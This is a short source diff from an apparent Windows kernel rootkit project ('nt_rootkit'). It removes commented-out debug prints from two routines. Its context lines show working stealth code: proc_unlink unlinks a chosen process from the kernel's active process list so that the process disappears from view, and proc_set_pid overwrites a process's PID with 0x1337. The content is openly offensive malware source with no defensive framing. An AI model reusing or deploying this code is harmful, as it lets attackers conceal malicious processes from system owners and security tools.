@@ -4,7 +4,6 @@ NTSTATUS proc_unlink(UINT32 pid)
 {
         if (!pid)
                 return STATUS_SUCCESS;
-        //DbgPrint("Invalid PID!");
 
         PEPROCESS curr_proc = PsGetCurrentProcess();
 
@@ -18,12 +17,7 @@ NTSTATUS proc_unlink(UINT32 pid)
                 PUINT32 curr_pid = (PUINT32)(((ULONG_PTR)curr_entry -
                         PROC_LINKS_OFFSET) + PID_OFFSET);
 
-                //DbgPrint("nt_rootkit: target: %d", pid);
-                //DbgPrint("nt_rootkit: curr_pid: %d", *curr_pid);
-
                 if (*curr_pid == pid) {
-                        //DbgPrint("nt_rootkit: FOUND MATCHING PID");
-
                         if (MmIsAddressValid(curr_entry))
                                 RemoveEntryList(curr_entry);
 
@@ -39,7 +33,6 @@ NTSTATUS proc_set_pid(UINT32 pid)
 {
         if (!pid)
                 return STATUS_SUCCESS;
-        //DbgPrint("Invalid PID!");
 
         PEPROCESS curr_proc = PsGetCurrentProcess();
 
@@ -53,12 +46,7 @@ NTSTATUS proc_set_pid(UINT32 pid)
                 PUINT32 curr_pid = (PUINT32)(((ULONG_PTR)curr_entry -
                         PROC_LINKS_OFFSET) + PID_OFFSET);
 
-                //DbgPrint("nt_rootkit: target: %d", pid);
-                //DbgPrint("nt_rootkit: curr_pid: %d", *curr_pid);
-
                 if (*curr_pid == pid) {
-                        //DbgPrint("nt_rootkit: FOUND MATCHING PID");
-
                         if (MmIsAddressValid(curr_entry))
                                 *curr_pid = 0x1337;
 
